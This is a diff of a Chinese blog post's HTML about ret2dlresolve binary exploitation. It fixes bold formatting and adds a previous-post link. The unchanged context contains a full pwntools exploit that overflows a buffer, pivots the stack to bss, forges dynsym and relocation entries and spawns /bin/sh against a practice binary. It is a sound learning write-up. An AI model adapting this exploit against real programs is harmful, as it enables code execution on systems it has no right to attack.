@@ -300,7 +300,7 @@
 </blockquote>
 <blockquote>
 <p>根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行</p>
-<p>**fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0) **</p>
+<p><strong>fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)</strong></p>
 </blockquote>
 <p>最终构造exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x80482d0</span></span><br><span class="line">leave_ret = <span class="number">0x08048378</span></span><br><span class="line">pop_ebp = <span class="number">0x080484ab</span></span><br><span class="line">dynstr_addr = <span class="number">0x0804821c</span></span><br><span class="line">dynsym_addr = <span class="number">0x080481cc</span></span><br><span class="line">rel_addr = <span class="number">0x08048298</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(pop_ebp)+p32(bss+<span class="number">0x800</span>) + \</span><br><span class="line">    p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x800</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr = bss+<span class="number">0x910</span></span><br><span class="line">system_str = bss+<span class="number">0x900</span></span><br><span class="line"></span><br><span class="line">fake_rel = p32(read_got) + \</span><br><span class="line">    p32((((fake_dynsym_addr - dynsym_addr) // <span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span>)</span><br><span class="line">fake_dynsym = p32(system_str - dynstr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_rel_addr = fake_dynsym_addr+<span class="built_in">len</span>(fake_dynsym)</span><br><span class="line">bin_sh_addr = bss+<span class="number">0x900</span>+<span class="built_in">len</span>(<span class="string">b&#x27;system\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(read_load_plt)+p32(fake_rel_addr -</span><br><span class="line">                                          rel_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">payload += payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + \</span><br><span class="line">    <span class="string">b&#x27;system\x00/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_dynsym+fake_rel</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -339,6 +339,21 @@
 
         
             <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">劫持TLS结构</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next">
